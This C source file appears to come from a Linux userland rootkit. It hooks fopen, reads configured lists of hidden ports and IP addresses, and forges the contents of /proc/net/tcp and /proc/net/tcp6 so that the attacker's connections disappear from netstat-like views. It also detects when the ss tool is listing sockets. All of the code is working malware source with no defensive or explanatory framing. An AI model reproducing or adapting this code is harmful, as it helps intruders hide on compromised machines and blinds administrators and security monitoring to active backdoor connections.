int is_hidden_port(int port){
    preparehideports(readgid());

    FILE *fp;
    char buf[13], *buf_tok = NULL;
    int hidden_status = 0,
        low_port, high_port;

    hook(CFOPEN);
    fp = call(CFOPEN, HIDEPORTS, "r");
    if(fp == NULL) return 0;

    while(fgets(buf, sizeof(buf), fp) != NULL){
        buf[strlen(buf)-1] = '\0';

        if(strstr(buf, "-")){   /* hide specific port ranges */
            /* get the lowest and highest ports within the range... */
            buf_tok = strtok(buf, "-");
            low_port = atoi(buf_tok);       /* low */

            buf_tok = strtok(NULL, "-");
            high_port = atoi(buf_tok);      /* high */

            /* current port we're checking is within our specified hidden range. */
            if(port >= low_port && port <= high_port){
                hidden_status = 1;
                break;
            }
        }

        if(port == atoi(buf)){   /* current port we're checking is hidden */
            hidden_status = 1;
            break;
        }
    }

    fclose(fp);
    return hidden_status;
}

#ifdef HIDE_ADDRS
static char *getanip(const char *addr){
    char *ret, buf[32];
    int a,b,c,d;

    sscanf(addr, "%2x%2x%2x%2x", &a,&b,&c,&d);
    memset(buf, 0, sizeof(buf));
    snprintf(buf, sizeof(buf), "%u.%u.%u.%u", d,c,b,a);

    size_t rsize = strlen(buf)+1;
    ret = malloc(rsize);
    if(!ret) return NULL;
    memset(ret, 0, rsize);
    strncpy(ret, buf, rsize);
    return ret;
}

int is_hidden_addr(const char *addr){
    preparehideaddrs(readgid());

    FILE *fp;
    char line[32], *ip;
    int status = 0;

    hook(CFOPEN);
    fp = call(CFOPEN, HIDEADDRS, "r");
    if(fp == NULL){
        return 0;
    }

    ip = getanip(addr);
    if(ip == NULL){
        fclose(fp);
        return 0;
    }

    while(fgets(line, sizeof(line), fp) != NULL && status != 1){
        line[strlen(line)-1] = '\0';
        if(!strncmp(ip, line, strlen(ip)))
            status = 1;
    }

    fclose(fp);
    free(ip);
    return status;
}
#endif


int secret_connection(char line[]){
    if(rknomore())
        return 0;

    char raddr[128], laddr[128], etc[512];
    unsigned long rxq, txq, t_len,
                  retr, inode;
    int lport, rport, d, state, uid, t_run, tout;

    char *fmt = "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %511s\n";
    sscanf(line, fmt, &d, laddr, &lport, raddr, &rport, &state, &txq,
                             &rxq, &t_run, &t_len, &retr, &uid, &tout, &inode,
                             etc);

    if(is_hidden_port(lport) || is_hidden_port(rport))
        return 1;

#ifdef HIDE_ADDRS
    if(strlen(raddr) > 0 && is_hidden_addr(raddr))
        return 1;
#endif

    return 0;
}

int hideport_alive(void){
    char line[LINE_MAX];                       /* ss uses socket() to list open sockets.   */
    FILE *fp;                                  /* our socket() hook uses this function to  */
    int status = 0;                            /* break itself if a. calling process is ss */
                                               /*               + b. hidden port is in use */
    hook(CFOPEN);
    fp = call(CFOPEN, "/proc/net/tcp", "r");
    if(fp == NULL) return 0;
    while(fgets(line, sizeof(line), fp) != NULL){
        if(secret_connection(line)){
            status = 1;
            break;
        }
    }
    fclose(fp);

    if(status != 1){   /* check /proc/net/tcp6 too. */
        fp = call(CFOPEN, "/proc/net/tcp6", "r");
        if(fp == NULL) return 0;
        while(fgets(line, sizeof(line), fp) != NULL){
            if(secret_connection(line)){
                status = 1;
                break;
            }
        }
        fclose(fp);
    }

    return status;
}

FILE *forge_procnet(const char *pathname){
    FILE *tmp, *fp;
    char line[LINE_MAX];

    fp = redirstream(pathname, &tmp);
    if(fp == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(line, sizeof(line), fp) != NULL)
        if(!secret_connection(line))
            fputs(line, tmp);

    fclose(fp);
    fseek(tmp, 0, SEEK_SET);
    return tmp;
}
